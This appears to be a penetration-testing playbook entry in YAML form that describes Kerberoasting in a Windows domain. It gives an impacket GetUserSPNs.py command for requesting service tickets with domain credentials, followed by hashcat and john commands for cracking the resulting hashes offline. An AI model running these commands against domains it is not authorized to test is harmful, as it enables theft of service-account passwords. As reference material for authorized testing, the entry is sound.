name: windows_domain_kerberosting

info:
  title: Windows Domain Kerberosting
  author: evait security GmbH
  category: 04_windows_domain
  placeholder: SMBUser, SMBPass, SMBDomain
  references:
    - https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/
    - https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

content: |
  <p>Use impacket and a valid domain account in order to obtain signed service ticket for a specific SPN.</p>
  <code>GetUserSPNs.py @@SMBDomain/@@SMBUser:@@SMBPass -outputfile {{output_TGSs_file}}</code>
  <p>The received hashes can be attacked using bruteforce or dictionary attack with hashcat or john</p>
  <code>hashcat -m 13100 --force {{output_TGSs_file}} {{passwords_file}}</code>
  <code>john --format=krb5tgs --wordlist={{passwords_file}} {{output_TGSs_file}}</code>